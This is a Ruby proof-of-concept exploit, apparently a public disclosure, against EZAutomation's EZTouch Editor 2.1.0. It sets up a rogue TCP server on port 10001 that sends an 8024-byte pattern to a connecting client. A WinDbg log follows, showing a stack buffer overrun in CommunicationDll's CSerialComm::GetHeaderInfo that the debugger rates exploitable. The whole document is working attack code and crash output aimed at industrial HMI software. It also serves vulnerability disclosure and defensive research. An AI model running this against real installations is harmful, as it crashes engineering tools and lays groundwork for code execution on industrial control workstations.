#!/usr/bin/env ruby
# https://www.ezautomation.net/access.php
# https://www.ezautomation.net/downloads/EZTouch%20Editor%202.1.0%20(DEMO)%20Setup.exe 
# Setup -> Ethernet Setup...

require 'rex'
require 'socket'

buff = Rex::Text.pattern_create(8024)

server = TCPServer.new 10001 

loop do
  client =  server.accept
  select(nil,nil,nil,0) 
  client.write(buff + "\n")
end
__END__
STATUS_STACK_BUFFER_OVERRUN encountered
(264.b68): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=002359e0 ecx=75fac428 edx=0012dc71 esi=00000000 edi=0012e824
eip=75fac2a5 esp=0012deb8 ebp=0012df34 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
kernel32!UnhandledExceptionFilter+0x5f:
75fac2a5 cc              int     3
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\EZAutomation\EZTouch Editor\CommunicationDll.dll - 
*** ERROR: Module load completed but symbols could not be loaded for image00400000
0:000> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Stack Buffer Overrun (/GS Exception) starting at CommunicationDll!CSerialComm::GetHeaderInfo+0x00000000000008cd (Hash=0x4c296d25.0x695c5476)

An overrun of a protected stack buffer has been detected. This is considered exploitable, and must be fixed.
0:000> lmvm CommunicationDll
start    end        module name
00220000 00242000   CommunicationDll   (export symbols)       C:\Program Files\EZAutomation\EZTouch Editor\CommunicationDll.dll
    Loaded symbol image file: C:\Program Files\EZAutomation\EZTouch Editor\CommunicationDll.dll
    Image path: C:\Program Files\EZAutomation\EZTouch Editor\CommunicationDll.dll
    Image name: CommunicationDll.dll
    Timestamp:        Tue Jul 23 02:44:49 2019 (5D36C901)
    CheckSum:         00020370
    ImageSize:        00022000
    File version:     2.0.0.0
    Product version:  2.0.0.0
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        2.0 Dll
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Uticor Tecnologies
    ProductName:      CommunicationDll Dynamic Link Library
    InternalName:     CommunicationDll
    OriginalFilename: CommunicationDll.DLL
    ProductVersion:   2.0
    FileVersion:      2.0
    PrivateBuild:     2.0
    SpecialBuild:     2.0
    FileDescription:  ProgramLoader CommunicationDll DLL
    LegalCopyright:   Copyright (C) 2002
    LegalTrademarks:  Copyright (C) 2002
    Comments:         Copyright (C) 2002
